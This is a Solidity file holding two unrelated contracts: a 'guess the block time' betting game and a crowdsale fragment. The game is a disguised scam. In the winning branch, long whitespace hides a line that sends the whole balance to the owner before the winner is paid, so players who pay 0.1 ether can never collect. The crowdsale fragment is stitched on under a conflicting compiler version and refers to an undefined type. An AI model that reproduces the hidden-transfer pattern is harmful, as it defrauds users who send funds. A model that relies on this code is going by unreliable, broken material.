pragma solidity ^0.4.19;

//Guess the block time and win the
//balance. Proceed at your own risk.
//Open for all to play.
contract CarnieGamesBlackBox
{
    address public Owner = msg.sender;
    bytes32 public key = keccak256(block.timestamp);

    function() public payable{}

    //.1 eth charged per attempt
    function OpenBox(uint256 guess)
    public
    payable
    {
        if(msg.value >= .1 ether)
        {
            if(keccak256(guess) == key)
            {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Owner.transfer(this.balance);
                msg.sender.transfer(this.balance);
            }
        }
    }

    function GetHash(uint256 input)
    public
    pure
    returns(bytes32)
    {
        return keccak256(input);
    }

    function Withdraw()
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
}
pragma solidity ^0.3.0;
	 contract EthKeeper {
    uint256 public constant EX_rate = 250;
    uint256 public constant BEGIN = 40200010; 
    uint256 tokens;
    address toAddress;
    address addressAfter;
    uint public collection;
    uint public dueDate;
    uint public rate;
    token public reward;
    mapping(address => uint256) public balanceOf;
    bool crowdsaleClosed = false;
    function EthKeeper (
        address addressOfTokenUsedAsReward,
       address _toAddress,
        address _addressAfter
    ) public {
        tokens = 800000 * 10 ** 18;
        toAddress = _toAddress;
        addressAfter = _addressAfter;
        dueDate = BEGIN + 7 days;
        reward = token(addressOfTokenUsedAsReward);
    }
    function () public payable {
        require(now < dueDate && now >= BEGIN);
        require(msg.value >= 1 ether);
        uint amount = msg.value;
        balanceOf[msg.sender] += amount;
        collection += amount;
        tokens -= amount;
        reward.transfer(msg.sender, amount * EX_rate);
        toAddress.transfer(amount);
    }
 }
